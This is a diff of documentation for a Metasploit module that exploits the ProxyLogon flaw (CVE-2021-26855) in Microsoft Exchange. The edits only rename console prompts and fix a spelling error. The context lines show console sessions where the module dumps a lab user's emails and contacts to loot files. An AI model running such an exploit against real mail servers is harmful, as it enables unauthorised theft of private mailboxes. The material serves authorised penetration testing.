@@ -70,7 +70,7 @@ Dump user emails from exchange server.
 ## Scenarios
 
 ```
-msf6 auxiliary(gather/exchange_proxylogon_collector) > options 
+msf auxiliary(gather/exchange_proxylogon_collector) > options 
 
 Module options (auxiliary/gather/exchange_proxylogon_collector):
 
@@ -95,7 +95,7 @@ Auxiliary action:
    Dump (Emails)  Dump user emails from exchange server
 
 
-msf6 auxiliary(gather/exchange_proxylogon_collector) > run
+msf auxiliary(gather/exchange_proxylogon_collector) > run
 [*] Running module against 172.20.2.110
 
 [*] https://172.20.2.110:443 - Attempt to exploit for CVE-2021-26855
@@ -108,7 +108,7 @@ msf6 auxiliary(gather/exchange_proxylogon_collector) > run
 [*] https://172.20.2.110:443 - Selecting the first internal server found
 [*]  * targeting internal: server2
 [*] https://172.20.2.110:443 - Attempt to dump emails for <gaston.lagaffe@pwned.lab>
-[*]  * successfuly connected to: inbox
+[*]  * successfully connected to: inbox
 [*]  * selected folder: inbox (AQAYAGdhc3Rvbi5sYWdhZmYAZUBwd25lZC5sYWIALgAAA+uQmQIqiSJLiXyYWVYT65MBACRuvwACXEpAuhG13iUjVgwAAAIBDAAAAA==)
 [*]  * number of email found: 4
 [*] https://172.20.2.110:443 - Processing dump of 4 items
@@ -129,9 +129,9 @@ msf6 auxiliary(gather/exchange_proxylogon_collector) > run
 [+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120226_default_172.20.2.110_gaston.lagaffep_524052.txt
 [*] 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/exchange_proxylogon_collector) > set action Dump\ (Contacts) 
+msf auxiliary(gather/exchange_proxylogon_collector) > set action Dump\ (Contacts) 
 action => Dump (Contacts)
-msf6 auxiliary(gather/exchange_proxylogon_collector) > run
+msf auxiliary(gather/exchange_proxylogon_collector) > run
 [*] Running module against 172.20.2.110
 
 [*] https://172.20.2.110:443 - Attempt to exploit for CVE-2021-26855
@@ -144,13 +144,13 @@ msf6 auxiliary(gather/exchange_proxylogon_collector) > run
 [*] https://172.20.2.110:443 - Selecting the first internal server found
 [*]  * targeting internal: server2
 [*] https://172.20.2.110:443 - Attempt to dump contacts for <gaston.lagaffe@pwned.lab>
-[*]  * successfuly connected to: contacts
+[*]  * successfully connected to: contacts
 [*]  * selected folder: contacts (AQAYAGdhc3Rvbi5sYWdhZmYAZUBwd25lZC5sYWIALgAAA+uQmQIqiSJLiXyYWVYT65MBACRuvwACXEpAuhG13iUjVgwAAAIBDgAAAA==)
 [*]  * number of contact found: 1
 [*] https://172.20.2.110:443 - Processing dump of 1 items
 [+]  * file saved to /home/mekhalleh/.msf4/loot/20210312120243_default_172.20.2.110_gaston.lagaffep_160567.txt
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/exchange_proxylogon_collector) > 
+msf auxiliary(gather/exchange_proxylogon_collector) > 
 ```
 
 ## References
